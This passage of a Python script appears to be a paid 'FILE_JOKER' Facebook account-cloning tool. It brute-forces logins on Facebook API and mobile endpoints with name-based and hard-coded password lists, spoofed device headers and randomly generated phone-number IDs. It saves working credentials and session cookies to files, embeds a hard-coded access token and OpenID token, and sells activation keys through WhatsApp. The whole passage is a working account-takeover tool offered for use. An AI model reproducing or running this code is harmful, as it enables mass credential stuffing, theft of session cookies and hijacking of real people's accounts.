'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                headers = {'User-Agent':uaxx,
'Content-Type': 'application/x-www-form-urlencoded',
'x-fb-Connection-Type': 'MOBILE.LTE',
'Accept': '*/*',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
'Priority' : 'u=3,i',
'Zero-Rated': '0',
'X-Fb-Connection-Quality': 'GOOD',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-Fb-Device-Group': '5120',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'Content-Length': str(len(content_lenght))}
                q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);FILE_JOKERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={FILE_JOKERb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mFILE_JOKER-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/FILE_JOKER/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/FILE_JOKER/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\x1b[1;96m [FILE_JOKER-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/FILE_JOKER/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
        except Exception as e:
            pass
            
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mFILE_JOKER-XD-M2\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
            fbrv = str(random.randint(10000000, 99999999))
            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
            width = random.randint(720, 1440)
            height = random.randint(1080, 2560)
            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
            fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
            fban = random.choice(["FB4A", "FB5A", "FB6A"])
            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
            ####m2######
            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]'
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())             
                with requests.Session() as session:                                       
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"secure_family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "account_recovery",
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
"email": sid,
"password": ps,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "V2_UNTAGGED",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                headers = {'User-Agent':uaxx,
'Content-Type': 'application/x-www-form-urlencoded',
'x-fb-Connection-Type': 'MOBILE.LTE',
'Accept': '*/*',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
'Priority' : 'u=3,i',
'Zero-Rated': '0',
'X-Fb-Connection-Quality': 'GOOD',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-Fb-Device-Group': '5120',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'Content-Length': str(len(content_lenght))}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);FILE_JOKERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={FILE_JOKERb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mFILE_JOKER-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//FILE_JOKER/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/FILE_JOKER/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [FILE_JOKER-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/FILE_JOKER/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)

    def methodD(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mFILE_JOKER-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
            fbrv = str(random.randint(10000000, 99999999))
            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
            width = random.randint(720, 1440)
            height = random.randint(1080, 2560)
            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
            fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
            fban = random.choice(["FB4A", "FB5A", "FB6A"])
            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
            #####m4#####
            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]'
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())             
                with requests.Session() as session:                                       
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"secure_family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "account_recovery",
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
"email": sid,
"password": ps,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "V2_UNTAGGED",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                headers = {'User-Agent':uaxx,
'Content-Type': 'application/x-www-form-urlencoded',
'x-fb-Connection-Type': 'MOBILE.LTE',
'Accept': '*/*',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
'Priority' : 'u=3,i',
'Zero-Rated': '0',
'X-Fb-Connection-Quality': 'GOOD',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-Fb-Device-Group': '5120',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'Content-Length': str(len(content_lenght))}
                q = session.post("https://b-api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);FILE_JOKERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={FILE_JOKERb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mFILE_JOKER-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/FILE_JOKER/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/FILE_JOKER/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                  #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard//FILE_JOKER/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
           
    def pasw(self):       
            pw = []
            clear()
            print('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m] \033[38;5;46mHow many passwords do you want to add')
            sl = int(input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46mPut Limit \x1b[1;92m●  '))
            if sl =='':
                print('\n\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46mPut limit between 1 to 30')
            elif sl > 20:
                print('\n\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[38;5;196mPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46mPut Password {sr+1}\x1b[1;92m ●  '))
            os.system("clear")
            print(logo)
            print(f' TOTAL IDS FOR CLONE  :\033[38;5;46m %s ' % len(self.id))
            print(f'\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            print("\x1b[38;5;46mUse Airplane Mode More  OK IDS")
            from datetime import datetime
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            print("\x1b[38;5;46mCloneing Start Time \x1b[1;92m●\x1b[38;5;46m ", current_time)
            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with SiamFILE_JOKER(max_workers=30) as FILE_JOKERworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                FILE_JOKERworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                FILE_JOKERworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                FILE_JOKERworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                FILE_JOKERworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)

#######################
def AFG_CLONING():
    user=[]
    os.system('clear')
    print(logo)
    print(' EXAMPLE ANY COUNTRY SIM CODE')
    linex()
    kode = input(' CHOSE SIM CODE : ==>')
    linex()
    os.system('clear')
    print(logo)
    print(' EXAMPLE LIMIT [5000] [10000] [50000] [999999]')
    linex()
    limit = int(input(' INPUT  LEMIT : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as Aryan:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' CHOICE  ACOUNTS : '+tl)
        print(' CHOICE SIM  CODE :\x1b[1;92m '+kode)
        print('\x1b[1;92m THE PROCESS IS RUNNING IN THE BACKGROUND PLZ WAIT')
        linex()
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000','57573200','5727200','446688','first last']
            Aryan.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('THE PROCESS HAS BEEN COMPLETED')
    input('PRESS ENTER TO BACK ')
    EMRAN()
#----------def crack----------------#
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
          "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {  'authority': 'm.facebook.com',
    "method": 'GET',
     "scheme": 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '2.2250001430511475',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SOV43"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}

            lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[FILE_JOKER-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('FILE_JOKER-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[FILE_JOKER-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('FILE_JOKER-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;92m[FILE_JOKER]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass 
############            

##########
   
def main_apv():
    os.system("clear")
    print(logo)
    uuid = str(os.geteuid())
    Xyteee=('FILE_JOKER1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f" Your Key : \x1b[1;31m"+Xyteee)
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/Mr-FILE_JOKER8/Paid/blob/main/Approve.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            menu()
            pass 
        else: 
            print('\033[1;92m Now it will work well in all countries')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : FILE_JOKER Tools Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            print('\033[1;92m [\033[1;92m1\033[1;92m]\033[1;92m 8$ \033[1;92mApproval For 1 month')
            print(' \033[1;92m[\033[1;92m2\033[1;92m]\033[1;92m 6$ \033[1;92mApproval For 15 days')
            print(' \033[1;92m[\033[1;92m3\033[1;92m]\033[1;92m 3$ \033[1;92mApproval For 7 days \033[1;37m')
            print('\033[1;92m-----------------------------------------------------')
            Picchi = input(' Select Buy Option : ')
            os.system("clear")
            print(logo)
            print(f" \033[1;92mYour Key :\033[31;1m{Xyteee}")
            print("\x1b[1;92m Tools    : FB Cloning");print(" \033[1;92m\n \033[1;92m\033[1;92mNote: If You Are Free User Don't Come IB\033[0;0m");print('\n\x1b[1;92m [•] File Crack \x1b[1;92m\n [•] Random Crack \n [•] Exit Program')
            print("-----------------------------------------------------")
            url_wa = "https://api.whatsapp.com/send?phone=+93707266012&text="
            choice = input(" Enter your choice  : ")
            tks = ("Hi FILE_JOKER Sir, I Need To Buy Your FILE_JOKER Tools Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
            subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
            print('-----------------------------------------------------\n Run again with permission from admin')
            main_apv()
    except: 
        sys.exit()

with SiamFILE_JOKER(max_workers=30) as rhu:
 #   rhu.submit(sexy)
    rhu.submit(main_apv)



